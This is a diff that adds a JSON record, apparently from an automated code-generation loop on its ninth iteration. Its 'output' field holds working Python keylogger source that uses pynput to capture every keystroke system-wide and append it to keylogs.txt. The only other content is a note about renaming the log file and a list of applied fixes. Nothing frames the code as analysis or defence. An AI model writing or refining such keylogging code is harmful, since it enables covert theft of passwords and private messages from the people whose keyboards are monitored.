@@ -1,0 +1,8 @@
+{
+  "output": "import pynput\nfrom pynput import keyboard\ndef on_key_press(key):\n    log_file_name = 'keylogs.txt'\n    try:\n        with open(log_file_name, 'a', encoding='utf-8') as log_file:\n            if hasattr(key, 'char'):\n                log_file.write(key.char)\n                print(f'Alphanumeric key pressed: {key.char}')\n            else:\n                log_file.write(str(key))\n                print(f'Special key pressed: {str(key)}')\n    except Exception as e:\n        print(f'Error logging key: {e}')\nwith keyboard.Listener(on_press=on_key_press) as listener:\n    listener.join()",
+  "notes": "Changed log.txt to keylogs.txt",
+  "applied_fixes": [
+    "iteration8_issue1"
+  ],
+  "iterations": 9
+}
